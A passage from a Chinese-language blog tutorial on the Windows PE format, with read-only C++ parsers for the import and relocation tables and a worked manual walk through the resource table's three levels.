class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//4 读取文件</span></span><br><span class="line">DWORD dwRealSize = <span class="number">0</span>;</span><br><span class="line">ReadFile(hFile, buf, dwFileSize, &amp;dwRealSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//5 判断是不是PE文件</span></span><br><span class="line"><span class="keyword">if</span> (IsPE_File(buf) == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;这是一个PE文件&quot;);</span></span><br><span class="line">AnalyzeImportTabel(buf,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这不是一个PE文件&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">delete</span>[]buf;</span><br><span class="line">buf = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="keyword">char</span>* lpImage, DWORD dwRva)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = IMAGE_FIRST_SECTION(pNt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> dwRva;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 循环判断RVA落在了哪个区段中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva = pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pHeader[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pHeader[i].PointerToRawData;</span><br><span class="line"><span class="keyword">if</span> (dwRva &gt;= dwSectionRva &amp;&amp; dwRva &lt;= dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line">pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwFOA = dwRva - dwSectionRva + dwSectionFOA;</span><br><span class="line"><span class="keyword">return</span> dwFOA;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPE_File</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="keyword">if</span> (pDos-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pNt-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AnalyzeImportTabel</span><span class="params">(<span class="keyword">char</span>* lpImage,<span class="keyword">bool</span> bAnalyzeInt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取到导入表的结构</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line"><span class="comment">//1 获取到导入表的数据目录结构</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY dwImportDir = &amp;pNt-&gt;OptionalHeader.DataDirectory[<span class="number">1</span>];</span><br><span class="line"><span class="comment">//1 导入表的数据目录结构中，有导出表的RVA，咱们需要将其转换为FOA，才能在文件中使用</span></span><br><span class="line">DWORD dwImportFOA = RvaToFoa(lpImage, dwImportDir-&gt;VirtualAddress);</span><br><span class="line"><span class="comment">//1 已经得到了FOA，直接就能够找到导出表的结构</span></span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)(lpImage + dwImportFOA);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2 开始解析</span></span><br><span class="line"><span class="keyword">while</span> (pImportTable-&gt;Name!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//2.1 先解析DLL的名字</span></span><br><span class="line"> DWORD dwNameFoa =  RvaToFoa(lpImage,pImportTable-&gt;Name);</span><br><span class="line"> <span class="keyword">char</span>* pDllName = (<span class="keyword">char</span>*)(dwNameFoa + lpImage);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;DllName:%s\n&quot;</span>, pDllName);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//2.2 解析函数名字，选择用什么去解析</span></span><br><span class="line"> PIMAGE_THUNK_DATA32 pNameTable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (bAnalyzeInt == <span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">DWORD Foa  = RvaToFoa(lpImage, pImportTable-&gt;OriginalFirstThunk);</span><br><span class="line">pNameTable = (PIMAGE_THUNK_DATA32)(lpImage + Foa);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD Foa = RvaToFoa(lpImage, pImportTable-&gt;FirstThunk);</span><br><span class="line">pNameTable = (PIMAGE_THUNK_DATA32)(lpImage + Foa);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2.3 开始解析名字</span></span><br><span class="line"><span class="keyword">while</span> (pNameTable-&gt;u1.Ordinal!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//2.3.1 判断最高位是不是1</span></span><br><span class="line"><span class="keyword">if</span> (IMAGE_SNAP_BY_ORDINAL32(pNameTable-&gt;u1.Ordinal)==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//只有序号</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  序号:%x,名称:NULL\n&quot;</span>, pNameTable-&gt;u1.Ordinal&amp;<span class="number">0x7FFFFFFF</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//既有名字，又有序号</span></span><br><span class="line">DWORD dwNameFoa = RvaToFoa(lpImage, pNameTable-&gt;u1.AddressOfData);</span><br><span class="line">PIMAGE_IMPORT_BY_NAME pName  = (PIMAGE_IMPORT_BY_NAME)(dwNameFoa + lpImage);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  序号:%x,名称:%s\n&quot;</span>, pName-&gt;Hint,pName-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line">pNameTable++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;----------------------------\n&quot;</span>);</span><br><span class="line">pImportTable++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><h4 id="什么叫做重定位"><a href="#什么叫做重定位" class="headerlink" title="什么叫做重定位"></a>什么叫做重定位</h4><p>一般情况下，exe的默认加载基址是0x0040 0000</p><p>会有一些代码，是这样的：</p><p>lea eax, ds:[0x0040 1100]</p><p>push eax</p><p>call  printf</p><p>但是目前来看，几乎都不会加载到默认基址上。</p><p>比如说，exe加载到0x0050 0000上，那么以上的代码还对么？？</p><p>不对了，怎么才能对呢？？</p><p>lea eax, ds:[0x0050 1100]</p><p>push eax</p><p>call  printf</p><p>这样就对了。</p><p>由于一个模块加载到什么位置，几乎是不确定的，所以每次程序运行，都需要将使用了VA的地方进行一次修改。这个修改的过程就称之为重定位。</p><p>有一个区域就记录着，程序中的哪些位置使用了VA。这个区域就叫做重定位表。</p><p>为什么模块不加载到默认基址上？？</p><ol><li>对于dll来说，他默认基址上经常已经被别的模块使用了。</li><li>对于exe来说，每次都加载到默认基址，是一个危险的行为。数据和代码的地址每次都是固定的，就很危险。对于exe来说，就有一个随机基址的功能，使得每次运行，基址都不一样。</li></ol><h4 id="手工解析重定位"><a href="#手工解析重定位" class="headerlink" title="手工解析重定位"></a>手工解析重定位</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;<span class="comment">// (1) 需重定位数据的起始RVA</span></span><br><span class="line">    DWORD   SizeOfBlock;<span class="comment">// (2) 本结构与TypeOffset总大小</span></span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];// (3) 原则上不属于本结构</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span>  IMAGE_BASE_RELOCATION UNALIGNED IMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><img src="PE文件/ReGps.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>VirtualAddress:0A9000 ——-&gt;FOA:76E00</p><p>size:3ACC</p><img src="PE文件/ReGpsInfo.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>VirtualAddress:031000</p><p>SizeofBlock:30</p><table><thead><tr><th>数据</th><th>偏移</th><th>重定位位置</th><th>FOA</th><th>要重定位的数据</th></tr></thead><tbody><tr><td>3A7F</td><td>A7F</td><td>031000+A7F</td><td>2E7F</td><td>004A4840</td></tr><tr><td>3A85</td><td>A85</td><td>031000+A85</td><td>2E85</td><td>0048FC88</td></tr><tr><td>3A92</td><td>A92</td><td>031000+A92</td><td>2E92</td><td>004A4844</td></tr></tbody></table><p>咱们再OD中，去看RVA是031000+A7F的地址，发现确实是被重定位过的了。</p><img src="PE文件/ReGpsLodePe.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>怎么重定位的呢？？</p><p>原始VA - 默认基址  = 新VA - 新基址</p><p>验证：</p><p>0x00D6 0000  - 0x0040 0000  + 004A4840 得到就是0xE04840</p><h4 id="测试代码-2"><a href="#测试代码-2" class="headerlink" title="测试代码"></a>测试代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PATH <span class="meta-string">L&quot;C:\\Users\\hugan\\Desktop\\FileCleaner2.0.exe&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="keyword">char</span>* lpImage, DWORD dwRva)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPE_File</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AnalyzeReloc</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setlocale(LC_ALL, <span class="string">&quot;chs&quot;</span>);</span><br><span class="line"><span class="comment">//1 打开文件</span></span><br><span class="line">HANDLE hFile = CreateFile(</span><br><span class="line">PATH,</span><br><span class="line">GENERIC_ALL,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 获取文件大小</span></span><br><span class="line">DWORD dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//3 申请空间并初始化</span></span><br><span class="line"><span class="keyword">char</span>* buf = <span class="keyword">new</span> <span class="keyword">char</span>[dwFileSize] &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//4 读取文件</span></span><br><span class="line">DWORD dwRealSize = <span class="number">0</span>;</span><br><span class="line">ReadFile(hFile, buf, dwFileSize, &amp;dwRealSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//5 判断是不是PE文件</span></span><br><span class="line"><span class="keyword">if</span> (IsPE_File(buf) == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;这是一个PE文件&quot;);</span></span><br><span class="line">AnalyzeReloc(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这不是一个PE文件&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">delete</span>[]buf;</span><br><span class="line">buf = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="keyword">char</span>* lpImage, DWORD dwRva)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = IMAGE_FIRST_SECTION(pNt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> dwRva;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 循环判断RVA落在了哪个区段中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva = pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pHeader[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pHeader[i].PointerToRawData;</span><br><span class="line"><span class="keyword">if</span> (dwRva &gt;= dwSectionRva &amp;&amp; dwRva &lt; dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line">pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwFOA = dwRva - dwSectionRva + dwSectionFOA;</span><br><span class="line"><span class="keyword">return</span> dwFOA;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPE_File</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="keyword">if</span> (pDos-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pNt-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TYPEOFFSET</span> &#123;</span></span><br><span class="line">WORD OFFSET : <span class="number">12</span>;</span><br><span class="line">WORD TYPE : <span class="number">4</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AnalyzeReloc</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 找到重定位的结构体</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOption = &amp;pNt-&gt;OptionalHeader;</span><br><span class="line"><span class="comment">//1. 得到了重定位的数据目录</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pRelocDir = &amp;pOption-&gt;DataDirectory[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 得到重定位表</span></span><br><span class="line">PIMAGE_BASE_RELOCATION pReloc = </span><br><span class="line">(PIMAGE_BASE_RELOCATION)</span><br><span class="line">(RvaToFoa(lpImage, pRelocDir-&gt;VirtualAddress)+ lpImage);</span><br><span class="line"><span class="comment">//3. 开始解析重定位</span></span><br><span class="line"><span class="keyword">while</span> (pReloc-&gt;SizeOfBlock!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//得到描述每一个位置偏移的数组</span></span><br><span class="line">TYPEOFFSET* typeoffset = (TYPEOFFSET*)(pReloc + <span class="number">1</span>);</span><br><span class="line">DWORD dwCount = (pReloc-&gt;SizeOfBlock - <span class="number">8</span>) / <span class="number">2</span>;</span><br><span class="line">DWORD dwBeginRva =  pReloc-&gt;VirtualAddress;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;----------------------------------\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwCount; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (typeoffset[i].TYPE==<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwRelocRva = (dwBeginRva + typeoffset[i].OFFSET);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;要重定位的位置RVA：%p\n&quot;</span>, dwRelocRva);</span><br><span class="line">PDWORD pRelocData = (PDWORD)(RvaToFoa(lpImage, dwRelocRva) + lpImage);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;要重定位的数据：%p\n&quot;</span>, *pRelocData);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;类型是%d&quot;</span>, typeoffset[i].TYPE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;----------------------------------\n&quot;</span>);</span><br><span class="line"><span class="comment">//找到下一个0x1000字节重定位信息</span></span><br><span class="line">pReloc = (PIMAGE_BASE_RELOCATION)((<span class="keyword">char</span>*)pReloc + pReloc-&gt;SizeOfBlock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="资源表"><a href="#资源表" class="headerlink" title="资源表"></a>资源表</h3><p>菜单，对话框，图标，光标，位图，工具栏…..他们称之为资源,资源就是PE文件在运行的时候需要使用到的一些通用数据。编译的时候，将他们独立保存在一个区域中。</p><p>记录这些区域的一个结构，就是资源表了。</p><h4 id="理解资源表"><a href="#理解资源表" class="headerlink" title="理解资源表"></a>理解资源表</h4><p>当咱们通过数据目录表找到资源表的时候，这个资源表分成了3层结构：</p><p>第一层：一共有多少种资源</p><p>第二层：这种资源有多少个</p><p>第三层：这个资源的位置</p><h4 id="手工解析PE文件"><a href="#手工解析PE文件" class="headerlink" title="手工解析PE文件"></a>手工解析PE文件</h4><h5 id="找到资源表"><a href="#找到资源表" class="headerlink" title="找到资源表"></a>找到资源表</h5><p>找到资源表的数据目录：</p><p><img src="C:\Users\hugan\Desktop\PE\resourcebin.bmp" alt="resourcebin"></p><p>RVA:1AF000———–&gt; FOA:1A5400</p><p>SIZE:153058</p><h5 id="分析第一层"><a href="#分析第一层" class="headerlink" title="分析第一层"></a>分析第一层</h5><img src="PE文件/ResourceFirst.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p><strong>NumberOfNamedEntries：0x2</strong></p><p><strong>NumberOfIdEntries：0xC</strong></p><p>代表着后面有14个下面的结构体：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD NameOffset   :<span class="number">31</span>;<span class="comment">// (1) 资源名偏移</span></span><br><span class="line">            DWORD NameIsString:<span class="number">1</span>;<span class="comment">// (2) 资源名为字符串</span></span><br><span class="line">        &#125;;</span><br><span class="line">        DWORD   Name;<span class="comment">// (3) 资源/语言类型</span></span><br><span class="line">        WORD    Id;<span class="comment">// (4) 资源数字ID</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   OffsetToData;<span class="comment">// (5) 数据偏移地址</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD   OffsetToDirectory:<span class="number">31</span>;<span class="comment">// (6) 子目录偏移地址</span></span><br><span class="line">            DWORD   DataIsDirectory   :<span class="number">1</span>;<span class="comment">// (7) 数据为目录</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;IMAGE_RESOURCE_DIRECTORY_ENTRY,*PIMAGE_RESOURCE_DIRECTORY_ENTRY;</span><br></pre></td></tr></table></figure><p>第一个资源的信息：</p><p>Id：0x80008CC8  最高位是1，所以是以字符串为标识所以NameOffset：8CC8 这是一个相对于资源表起始位置的偏移 </p><p> 他不是RVA</p><p>​             1A5400+8CC8 = 1AE0C8</p><img src="PE文件/ResourceFirstInfo.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>OffsetToData：0x80 00 00 80 最高位为1，所以下一层是目录</p><p>OffsetToDirectory：80 这是一个相对于资源表起始位置的偏移</p><p>​               他不是RVA</p><p>1A5400+80 = 1A5480</p><h5 id="这个就是第二层的位置"><a href="#这个就是第二层的位置" class="headerlink" title="这个就是第二层的位置"></a>这个就是第二层的位置</h5><img src="PE文件/ResourceTwo.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>Id：0x800095E0</p><p>NameOffset：95E0</p><p>1A5400+95E0 = 1AE9E0</p><img src="PE文件/ResourceTwoInfo.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>OffsetToData：0x80001890</p><p>OffsetToDirectory：1890</p><p>1A5400+1890 = 1A6C90</p><h5 id="这个就是第三层的位置了"><a href="#这个就是第三层的位置了" class="headerlink" title="这个就是第三层的位置了"></a>这个就是第三层的位置了</h5><img src="PE文件/ResourceThree.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>OffsetToData：5F20</p><p>​           1A5400+5E20 =1AB220</p><p>和LordPE种解析出来的是一样的</p><img src="PE文件/ResourceLodePe.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><h4 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 